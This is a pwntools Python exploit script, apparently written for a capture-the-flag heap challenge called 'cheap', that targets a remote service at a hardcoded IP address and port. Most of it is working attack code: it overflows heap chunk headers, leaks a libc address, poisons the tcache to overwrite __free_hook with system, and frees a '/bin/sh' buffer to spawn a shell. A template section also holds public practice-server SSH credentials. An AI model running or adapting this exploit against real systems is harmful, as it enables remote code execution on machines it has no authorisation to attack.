from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './cheap'
REMOTE_BIN = '~/vuln'  # For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

elif REMOTETTCP:
    P = remote('34.146.101.4', 30001)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN)  # start the vuln binary
    elf = ELF(LOCAL_BIN)  # Extract data from binary
    rop = ROP(elf)  # Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')

##########################
##### OFFSET FINDER ######
##########################

#####################
#### Find Gadgets ###
#####################


#########################
#### Finf LIBC offset ###
#########################

##########################
##### FUNCTION ######
##########################

def create(size, data):
    P.sendlineafter(b'Choice:', b'1')
    P.sendlineafter(b'size:', str(size).encode())
    P.sendlineafter(b'data:', data)
    print('Add 1 page with size ', size)


def remove():
    P.sendlineafter(b'Choice: ', b'3')


def show():
    P.sendlineafter(b'Choice: ', b'2')


##############################
##### FINAL EXPLOITATION #####
##############################
create(0x10, b'')
remove()
create(0x20, b'')
remove()
create(0x390, b'')
create(0x90, b'')
create(0x30, b'')
create(0x10, b'A'*0x18+p64(0x471))
create(0x20, b'')
remove()
show()
leak = u64(P.recvline().strip().ljust(8,b'\x00'))
LIBC.address = leak - 0x1ebbe0
create(0x460,b'')
create(0x10, b'')
remove()
create(0x20, b'')
remove()
create(0x30, b'')
remove()
create(0x40,b'')
remove()
create(0x10, b'\x00'*0x18+p64(0x31)+b'\x00'*0x28+p64(0x51))
create(0x30, b'')
remove()
create(0x20, b'\x00'*0x28+p64(0x51)+p64(LIBC.sym['__free_hook']))
create(0x40, b'')
create(0x40,p64(LIBC.sym['system']))
create(0x100,b'/bin/sh')
remove()
P.interactive()
